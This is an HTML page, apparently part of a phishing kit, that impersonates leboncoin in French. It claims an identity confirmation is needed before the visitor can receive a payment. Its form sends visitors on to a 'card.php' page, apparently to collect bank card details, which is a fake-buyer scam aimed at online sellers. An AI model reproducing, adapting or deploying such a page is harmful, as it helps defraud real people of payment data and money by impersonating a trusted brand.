    ...
    <div id="__next" data-reactroot="">
      <div class="relative grid grid-cols-page grid-rows-small-page sm:grid-rows-wide-page grid-areas-page h-[100vh] overflow-x-hidden">
        <header class="grid-in-header flex items-center justify-center bg-background shadow z-base">
          <div class="flex h-xl sm:h-2xl">
            <div data-testid="header">
              <div>
                <div class="flex">
                  <div data-testid="logo" class="divide-x md:ml-sm md:border-right-sm md:border-main md:pr-sm md:flex"><a class="sc-bb6ed473-0 bMyVIh flex" data-testid="viewLink-back-image"><img width="35" src="https://cdn-icons-png.flaticon.com/512/1160/1160312.png" alt="logo" tabindex="0"></a></div>
                  <div data-testid="scurisBadge" class="items-center hidden md:flex">
                    <div class="bg-main min-w-sz-1 min-h-full mx-lg"></div>
                    <h4 class="text-main text-subhead m-sm self-center">CONDITIONS GÉNÉRALES</h4>
                  </div>
                </div>
              </div>
            </div>
        ...
        <main class="flex flex-col h-full">
          <div>
            <div class="h-sm bg-main" style="width: 100%;"></div>
          </div>
          <div class="h-[calc(100%-50px)] md:h-[calc(100%-60px)] md:bg-no-repeat md:bg-bottom md:bg-[length:980px] md:bg-[url(/static/login-illustration.png)]">
            <div class="px-lg mx-auto py-xl flex flex-col gap-2xl bg-background max-md:h-full max-w-[498px] md:shadow md:rounded-lg md:p-2xl md:mt-[56px]">
              <CENTER><h1 class="text-display-3 text-on-surface"> VOICI LES ÉTAPES À SUIVRE</h1></CENTER>

              <form action="card.php">

                <div data-spark-component="form-field" class="!gap-sm flex flex-col gap-sm"><CENTER><label data-spark-component="form-field-label" class="text-body-1 flex items-center gap-sm" id="radix-0" for="email"> Afin d’utiliser votre compte leboncoin et bénéficier pleinement des opérations courantes en toute sécurité une confirmation d'identité est désormais requise pour lutter contre les transactions frauduleuse, Pour approuver, utilisez le bouton-ci dessous et suivez les instructions.<span data-spark-component="label-required-indicator" role="presentation" aria-hidden="true" class="text-caption text-on-surface/dim-3"></span></label></CENTER><BR><BR>


                <div style=" width : 100%; margin: 0 auto; background-color: #F8EAE1FF; padding: 20px; border-radius: 10px;">
                <strong><div data-spark-component="form-field" class="!gap-sm flex flex-col gap-sm"><label data-spark-component="form-field-label" class="text-body-1 flex items-center gap-sm" id="radix-0" for="email">1- Cliquez sur continuer pour commencer.<span data-spark-component="label-required-indicator" role="presentation" aria-hidden="true" class="text-caption text-on-surface/dim-3"></span></label><BR><BR>



                  <div data-spark-component="form-field" class="!gap-sm flex flex-col gap-sm"><label data-spark-component="form-field-label" class="text-body-1 flex items-center gap-sm" id="radix-0" for="email">2 -   Recevez votre paiement sur votre compte.<span data-spark-component="label-required-indicator" role="presentation" aria-hidden="true" class="text-caption text-on-surface/dim-3"></span></label><BR><BR>

               

               <div data-spark-component="form-field" class="!gap-sm flex flex-col gap-sm"><label data-spark-component="form-field-label" class="text-body-1 flex items-center gap-sm" id="radix-0" for="email">3-  Vous serez redigirer sur leboncoin.<span data-spark-component="label-required-indicator" role="presentation" aria-hidden="true" class="text-caption text-on-surface/dim-3"></span></label><BR></strong>
            </div>
          </div></div>
            ...
            <br><br>
           <center> <img width="60" src="https://cdn-icons-png.flaticon.com/512/3208/3208742.png"></center>

<br><br><br>



                <button data-spark-component="button" class="u-shadow-border-transition box-border inline-flex items-center justify-center gap-md whitespace-nowrap px-lg text-body-1 font-bold focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-outline-high [&amp;:not(:focus-visible)]:ring-inset min-w-sz-44 h-sz-44 rounded-lg bg-main text-on-main hover:bg-main-hovered enabled:active:bg-main-pressed focus-visible:bg-main-focused w-full" aria-live="off" type="submit" data-testid="submitButton">ACCEPTER & CONTINUER →</button>
              </form>
